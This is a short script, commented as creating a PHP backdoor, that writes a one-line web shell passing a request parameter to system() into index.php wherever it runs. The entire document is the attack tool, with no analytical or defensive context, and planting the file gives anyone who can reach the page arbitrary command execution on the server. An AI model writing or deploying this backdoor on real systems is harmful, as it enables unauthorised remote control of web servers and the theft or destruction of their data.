# this script creates a php backdoor in a file called index.php where the program is executed

# declare constants
code = '<?php system($_REQUEST[\'cmd\']); ?>'
file = 'index.php'
mode = 1006 # this flag is "w+"

# create file
fd = open(file, mode)
write(fd, code)
close(fd)

exit(0)
